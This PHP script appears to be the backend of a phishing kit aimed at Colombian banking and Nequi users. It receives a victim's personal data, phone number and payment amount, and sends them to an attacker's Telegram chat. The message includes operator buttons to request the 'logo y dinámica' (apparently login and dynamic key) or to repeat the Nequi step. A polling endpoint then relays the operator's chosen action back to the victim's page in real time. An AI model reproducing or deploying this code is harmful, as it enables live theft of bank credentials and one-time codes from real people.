<?php
ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

/* ============================================================
   ARCHIVOS
   ============================================================ */
$USED_TOKENS_FILE = __DIR__ . '/used_tokens.json';

/* ============================================================
   CARGAR CONFIG
   ============================================================ */
function loadConfig()
{
    $file = __DIR__ . '/../config.php';
    if (!file_exists($file)) return null;

    $config = require $file;
    if (empty($config['bot_token']) || empty($config['chat_id'])) return null;

    return [
        'token'   => $config['bot_token'],
        'chat_id'=> $config['chat_id']
    ];
}

/* ============================================================
   TELEGRAM: SEND MESSAGE
   ============================================================ */
function sendMessage($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);
    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

/* ============================================================
   TELEGRAM: EDIT MESSAGE
   ============================================================ */
function editMessage($token, $chatId, $messageId, $text)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/* ============================================================
   KEYBOARD
   ============================================================ */
function buildKeyboard($tid)
{
    return [
        'inline_keyboard' => [
            [['text' => '🧠🖼 Pedir logo y dinámica', 'callback_data' => "dinamica_logo:$tid"]],
            [['text' => '✅ Pago enviado', 'callback_data' => "enviado:$tid"]],
            [['text' => '🔁 Repetir Nequi', 'callback_data' => "repetir:$tid"]],
            [['text' => '🔄 Elegir otro método', 'callback_data' => "otro:$tid"]],
            [['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]]
        ]
    ];
}

/* ============================================================
   MENSAJE
   ============================================================ */
function formatMessage($d)
{
    $b = $d['bancoldata'] ?? [];
    $monto = number_format((float)($d['total'] ?? 0), 0, ',', '.');

    $msg = "<b>🧾 Información del Cliente</b>\n\n";
    if (!empty($d['tbdatos']) && is_array($d['tbdatos'])) {
        foreach ($d['tbdatos'] as $k => $v) {
            $msg .= "• " . ucfirst(str_replace('_', ' ', $k)) . ": <code>$v</code>\n";
        }
    }

    $msg .= "\n<b>💸 Pago Nequi</b>\n";
    $msg .= "• 🆔 Transaction ID: <code>{$d['transactionId']}</code>\n";
    $msg .= "• 📱 Número: <code>" . ($b['usuario'] ?? 'N/D') . "</code>\n";
    $msg .= "• 💰 Monto: <b>$ {$monto}</b>";

    return $msg;
}

/* ============================================================
   TOKENS
   ============================================================ */
function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;
    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];
    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

/* ============================================================
   CONFIG
   ============================================================ */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   POST → ENVÍO INICIAL
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $d = json_decode(file_get_contents('php://input'), true);
    $tid = $d['transactionId'] ?? '';

    if (!$tid || isTokenUsed($tid)) {
        echo json_encode(['ok' => false]);
        exit;
    }

    markTokenUsed($tid);

    $msg = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode(['ok' => !empty($sent['ok'])]);
    exit;
}

/* ============================================================
   GET → POLLING DESDE ACTIONS
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {
    $tid = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$_GET['transactionId']);
    $searchDirs = [
        '/var/www/diente/actions',
        '/var/www/diente/cu/actions',
        __DIR__ . '/actions',
        __DIR__ . '/../actions',
        __DIR__ . '/../../actions',
        __DIR__ . '/../../../actions'
    ];
    $action = null;
    foreach ($searchDirs as $dir) {
        $file = $dir . '/' . $tid . '.txt';
        if (file_exists($file)) {
            $raw = @file_get_contents($file);
            if ($raw !== false && trim($raw) !== '') {
                $parts = explode('|', trim($raw), 2);
                $action = trim($parts[0]);
                @unlink($file);
                break;
            }
        }
    }

    if ($action !== null && $action !== '') {
        if (ob_get_length()) ob_clean();
        echo json_encode(['ok' => true, 'action' => $action]);
        exit;
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false]);
exit;
